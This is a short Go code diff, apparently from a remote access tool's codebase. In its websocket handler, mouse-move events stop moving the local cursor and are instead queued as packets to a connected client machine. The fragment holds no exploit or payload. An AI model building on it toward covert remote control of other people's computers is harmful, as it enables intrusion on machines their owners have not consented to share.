@@ -4,7 +4,6 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
-	"rat/client/screen"
 	"rat/common"
 	"time"
 
@@ -171,7 +170,7 @@ func incomingWebSocket(ws *websocket.Conn) {
 				break
 			}
 
-			screen.MoveCursor(mouseEvent.Monitor, int(mouseEvent.X), int(mouseEvent.Y))
+			client.Queue <- MouseMovePacket{mouseEvent.Monitor, int(mouseEvent.X), int(mouseEvent.Y)}
 		} else if event.Event == TransfersEvent {
 			err := json.Unmarshal([]byte(event.Data), &DisplayTransfers)
 
